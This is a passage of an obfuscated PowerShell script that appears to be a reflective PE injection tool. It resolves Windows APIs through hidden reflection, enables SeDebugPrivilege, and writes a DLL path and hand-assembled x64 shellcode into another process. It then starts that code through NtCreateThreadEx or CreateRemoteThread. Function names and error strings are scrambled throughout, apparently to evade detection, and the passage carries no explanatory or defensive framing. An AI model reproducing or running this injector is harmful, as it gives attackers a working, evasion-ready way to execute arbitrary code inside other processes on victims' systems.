        $l64ftion | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = klsdjlkhfDjswpdy Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = klsdjlkhfDjswpdy Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = klsdjlkhfDjswpdy Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        

        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = klsdjlkhfDjswpdy NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $l64ftion | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = klsdjlkhfDjswpdy Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = klsdjlkhfDjswpdy Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $l64ftion | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
    
        $LocalFreeAddr = klsdjlkhfDjswpdy kernel32.dll VirtualFree
        $LocalFreeDelegate = Get-DelegateType @([IntPtr])
        $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
        $l64ftion | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

        return $l64ftion
    }


            






    Function bud-ksgLHDnwn
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver

                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {

                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $LSIINFO,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $workhards,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($workhards) ($Size))
        
        $PEEndAddress = $LSIINFO.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($LSIINFO.LKSHKDANDL) ($workhards)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    


    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $LHFSser = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $LHFSser.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $LHFSser.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $LHFSser.CreateType()
    }



    Function klsdjlkhfDjswpdy
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )


        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)


        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $l64ftion,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $DJH32H,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants
        )
        
        [IntPtr]$ThreadHandle = $l64ftion.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $l64ftion.OpenThreadToken.Invoke($ThreadHandle, $WiSDGKDants.TOKEN_QUERY -bor $WiSDGKDants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $WiSDGKDants.ERROR_NO_TOKEN)
            {
                $Result = $l64ftion.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }
                
                $Result = $l64ftion.OpenThreadToken.Invoke($ThreadHandle, $WiSDGKDants.TOKEN_QUERY -bor $WiSDGKDants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.LUID))
        $Result = $l64ftion.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$DJH32H.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$DJH32H.LUID)
        $TokenPrivileges.Privileges.Attributes = $WiSDGKDants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $l64ftion.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {

        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function sadkjhdsjD
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $workhards,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $NotTodayPal = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $l64ftion
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version

        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $workhards"
            $RetVal= $l64ftion.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $workhards, $NotTodayPal, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }

        else
        {
            Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $workhards"
            $RemoteThreadHandle = $l64ftion.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $workhards, $NotTodayPal, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Verbose "Error creating remote thread, thread handle is null"
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $LKSHKDANDL,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $DJH32H
        )
        
        $NINOFSD = New-Object System.Object
        

        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LKSHKDANDL, [Type]$DJH32H.IMAGE_DOS_HEADER)


        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LKSHKDANDL) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NINOFSD | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$DJH32H.IMAGE_NT_HEADERS64)
        

        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NINOFSD | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NINOFSD | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$DJH32H.IMAGE_NT_HEADERS32)
            $NINOFSD | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NINOFSD | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NINOFSD
    }



    Function DHWE-kidD
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PPSDHKDSDBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $DJH32H
        )
        
        $LSIINFO = New-Object System.Object
        

        [IntPtr]$UnmanagedPPSDHKDSDBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PPSDHKDSDBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PPSDHKDSDBytes, 0, $UnmanagedPPSDHKDSDBytes, $PPSDHKDSDBytes.Length) | Out-Null
        

        $NINOFSD = Get-ImageNtHeaders -LKSHKDANDL $UnmanagedPPSDHKDSDBytes -DJH32H $DJH32H
        

        $LSIINFO | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NINOFSD.PE64Bit)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NINOFSD.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NINOFSD.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NINOFSD.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NINOFSD.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPPSDHKDSDBytes)
        
        return $LSIINFO
    }




    Function KDHSD-JUWF
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $LKSHKDANDL,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $DJH32H,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants
        )
        
        if ($LKSHKDANDL -eq $null -or $LKSHKDANDL -eq [IntPtr]::Zero)
        {
            throw 'LKSHKDANDL is null or IntPtr.Zero'
        }
        
        $LSIINFO = New-Object System.Object
        

        $NINOFSD = Get-ImageNtHeaders -LKSHKDANDL $LKSHKDANDL -DJH32H $DJH32H
        

        $LSIINFO | Add-Member -MemberType NoteProperty -Name LKSHKDANDL -Value $LKSHKDANDL
        $LSIINFO | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NINOFSD.IMAGE_NT_HEADERS)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NINOFSD.NtHeadersPtr)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NINOFSD.PE64Bit)
        $LSIINFO | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NINOFSD.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($LSIINFO.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_NT_HEADERS64)))
            $LSIINFO | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_NT_HEADERS32)))
            $LSIINFO | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NINOFSD.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $WiSDGKDants.IMAGE_FILE_DLL) -eq $WiSDGKDants.IMAGE_FILE_DLL)
        {
            $LSIINFO | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NINOFSD.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $WiSDGKDants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $WiSDGKDants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $LSIINFO | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $LSIINFO
    }
    
    
    Function HDSK-OUHF
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $applejuce,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, $DllPathSize, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "sdasdasdasdgggg"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $l64ftion.WriteProcessMemory.Invoke($applejuce, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Hand32Ker = $l64ftion.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $l64ftion.GetProcAddress.Invoke($Hand32Ker, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero


        if ($LSIINFO.PE64Bit -eq $true)
        {

            $LoadLibraryARetMem = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, $DllPathSize, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "skaldjasd"
            }
            
            

            $LoaskdLiLIHDS1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoaskdLiLIHDS1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoaskdLiLIHDS1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoaskdLiLIHDS1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "KSHDD"
            }
            
            $Success = $l64ftion.WriteProcessMemory.Invoke($applejuce, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "SLKDHLKD"
            }
            
            $RThreadHandle = sadkjhdsjD -ProcessHandle $applejuce -workhards $RSCAddr -l64ftion $l64ftion #-
            $Result = $l64ftion.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "sd22."
            }
            

            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $l64ftion.ReadProcessMemory.Invoke($applejuce, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $l64ftion.VirtualFreeEx.Invoke($applejuce, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
            $l64ftion.VirtualFreeEx.Invoke($applejuce, $RSCAddr, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = sadkjhdsjD -ProcessHandle $applejuce -workhards $LoadLibraryAAddr -NotTodayPal $RImportDllPathPtr -l64ftion $l64ftion #-
            $Result = $l64ftion.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "sd22."
            }
            
            [Int32]$ExitCode = 0
            $Result = $l64ftion.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $l64ftion.VirtualFreeEx.Invoke($applejuce, $RImportDllPathPtr, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function KJSHDeUFHEF7
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $applejuce,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        

        $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $RFuncNamePtr = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, $FunctionNameSize, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_READWRITE)
        if ($RFuncNamePtr -eq [IntPtr]::Zero)
        {
            Throw "Unass"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $l64ftion.WriteProcessMemory.Invoke($applejuce, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($FunctionNameSize -ne $NumBytesWritten)
        {
            Throw "Drocess"
        }
        

        $Hand32Ker = $l64ftion.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $l64ftion.GetProcAddress.Invoke($Hand32Ker, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        

        $bannaaGet = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_READWRITE)
        if ($bannaaGet -eq [IntPtr]::Zero)
        {
            Throw "sdasdasdasdgggg for the return value of GetProcAddress"
        }
        
        



        [Byte[]]$GetProcAddressSC = @()
        if ($LSIINFO.PE64Bit -eq $true)
        {
